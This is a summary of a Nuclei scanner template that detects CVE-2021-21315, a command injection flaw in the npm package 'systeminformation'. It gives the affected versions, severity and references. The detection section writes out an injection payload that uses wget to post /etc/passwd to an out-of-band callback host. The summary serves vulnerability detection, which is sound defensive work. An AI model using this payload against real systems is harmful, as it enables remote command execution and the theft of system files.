---
cve_id: CVE-2021-21315
template_path: nuclei-templates/http/cves/2021/CVE-2021-21315.yaml
affected_product: Node.JS System Information Library
severity: high
authentication: none
external_callback: true
affected_versions: <5.3.1
preconditions: [web application integrates the library and passes unsanitized user-controlled parameters (including arrays) to functions such as si.services(), si.inetLatency(), si.inetChecksite(), si.processLoad()]
poc_classification: rce
---

## Vulnerability
Node.JS System Information Library (npm package "systeminformation") before version 5.3.1 is susceptible to remote command injection (CWE-78). It is an open-source collection of functions to retrieve detailed hardware, system and OS information.

Successful exploitation allows remote attackers to execute arbitrary commands on the affected system (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H, score 7.8).

## PoC / Detection
Classification: rce

The template issues a single GET request to `{{BaseURL}}/api/getServices?name[]=$(wget --post-file /etc/passwd {{interactsh-url}})` and verifies a 200 OK response with `application/json` Content-Type header whose body simultaneously contains the exact injected command string plus the words "name", "running" and "pids". Reflection of the unsanitized payload combined with the OOB wget mechanism confirms command injection.

## References
- https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC
- https://security.netapp.com/advisory/ntap-20210312-0007/
- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-2m8v-572m-ff2v
- https://www.npmjs.com/package/systeminformation
- https://nvd.nist.gov/vuln/detail/CVE-2021-21315
